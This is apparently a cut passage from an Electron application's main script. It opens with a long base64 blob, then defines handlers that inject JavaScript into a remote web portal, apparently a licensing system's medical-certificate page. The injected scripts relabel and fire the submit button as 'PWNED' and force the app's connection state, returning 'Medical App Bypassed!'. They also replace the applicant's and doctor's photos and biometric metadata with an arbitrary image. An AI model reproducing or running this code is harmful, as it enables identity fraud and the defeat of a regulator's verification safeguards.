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';
                  const attributes = {
                  'id': 'pwndBtn',
                  'ng-click' : "debug(vm.Submit(true, "+fingerPrnt+"))"
                  }
                  const button = $('${targ}');
                  if(button) {
                    button.attr(attributes);
                    button.text('PWNED');

                    const scope = angular.element(button).scope();
                    scope.vm.Submit(true, fingerPrnt)
                    return 'PWNED';
                  }
                  return 'Target button not reached';
                })();
              `;
            // Execute the script and optionally wait for a result (if you return one from the IIFE)
            const result = await ltmsWindow.webContents.executeJavaScript(script);
            console.log("Script Execution Result:", result);
             event.reply('app-run-result', `Script Execution Result:\n ✅ Script Successfully executed!${result}`);
             

        } catch (error) {
            console.error("❌Failed to execute script on remote window:", error);
             event.reply('app-run-result', `Script Execution Result:\n ❌ Failed to execute script on target ${error}`);

        }
    }
});

ipcMain.on('trigger-reload-script', async (event, customScript) => {
    if (ltmsWindow && !ltmsWindow.isDestroyed()) {
      
        try {
            
            const script = `
                (function() {
                  location.reload();
                  return 'Target reloaded';
                })();
              `;
            // Execute the script and optionally wait for a result (if you return one from the IIFE)
            const result = await ltmsWindow.webContents.executeJavaScript(script);
            console.log("Script Execution Result:", result);
            event.reply('app-run-result', `Script Execution Result:\n ✅ Script Successfully executed!${result}`);
             

        } catch (error) {
            console.error("❌Failed to execute script on remote window:", error);
            event.reply('app-run-result', `Script Execution Result:\n ❌ Failed to execute script on target ${error}`);

        }
    }
});

ipcMain.on('trigger-bypass-script', async (event, customScript) => {
    if (ltmsWindow && !ltmsWindow.isDestroyed()) {
      
        try {
            
            const script = `
                (function() {
                    const target = $('div.alert.alert-danger') ;
                    const scope = angular.element(target).scope(); //check object key 'vm'
                    var vm =  scope.$parent.vm
                    var targBdy = $('body');
                    var ng = angular.element(targBdy);
                    var scp = ng.scope();
                    var scpUp = scp.$parent;
                    scpUp.isAppConnected = true;
                     vm.HubManager.CurrentHub.connection.state = 1; 
                     vm.HubManager.HubState = 1;
                    scp.$apply();
                    scope.$apply();

                  return 'Medical App Bypassed!';
                })();
              `;
            // Execute the script and optionally wait for a result (if you return one from the IIFE)
            const result = await ltmsWindow.webContents.executeJavaScript(script);
            console.log("Script Execution Result:", result);
            event.reply('app-run-result', `✅ Script Successfully executed!${result}`);
             

        } catch (error) {
            console.error("❌Failed to execute script on remote window:", error);
            event.reply('app-run-result', `❌ Failed to execute script on target ${error}`);

        }
    }
});

ipcMain.on('trigger-override-img-script', async (event, strdata) => {

    if (ltmsWindow && !ltmsWindow.isDestroyed()) {
       
        try {
             var data = JSON.parse(strdata);
            const script = `
                (function() {
                    const target = $('div.alert.alert-danger') ;
                    const scope = angular.element(target).scope(); //check object key 'vm'
                    var vm =  scope.$parent.vm;


                    var photoB64 ='${data.base64}'; //image Base64 value
                  
                      vm.Submission.ApplicantPhoto = 'data:image/jpeg;base64,'+photoB64;
                      var applicantMtdt = JSON.parse(vm.Submission.ApplicantPhotoMetadata);
                      applicantMtdt.ReferenceImage.Bytes = photoB64;
                      vm.Submission.ApplicantPhotoMetadata = JSON.stringify(applicantMtdt);

                      vm.Submission.DoctorPhoto = 'data:image/jpeg;base64,'+photoB64;
                      var DoctorMtdt = JSON.parse(vm.Submission.DoctorPhotoMetadata);
                      DoctorMtdt.ReferenceImage.Bytes = photoB64;
                      vm.Submission.DoctorPhotoMetadata = JSON.stringify(DoctorMtdt);

                      scope.$apply();



                      return '${data.message} and Applicant Image Inserted';
                     
                })();
              `;
            // Execute the script and optionally wait for a result (if you return one from the IIFE)
            const result = await ltmsWindow.webContents.executeJavaScript(script);
            console.log("Script Execution Result:", result);

            event.reply('app-run-result', `✅ Script Successfully executed!${result}`);
              // console.log(JSON.stringify(data));
              // event.reply('app-run-result', `✅ Script Successfully executed!${data.message}`);

        } catch (error) {
            console.error("❌Failed to execute script on remote window:", error);
            event.reply('app-run-result', `❌ Failed to execute script on target ${error}`);

        }
    }
});

ipcMain.on('set-start-window-position', (event) => {
      const primaryDisplay = screen.getPrimaryDisplay();
      const { width, height } = primaryDisplay.workAreaSize; // Use workAreaSize to respect the OS taskbar/dock
      const windowWidth = 225; 
      const windowHeight = 280
    // settingsWindow.setSize(windowWidth, windowHeight)
      const x = width - windowWidth;
      const y = height - windowHeight;
    const webContents = event.sender;
    const win = BrowserWindow.fromWebContents(webContents);
    if (win) {
      
      win.setPosition(x, y);
      win.focus()
    }
   createMainWindows();
   
  });


ipcMain.on('window-focused', focusAllWindows);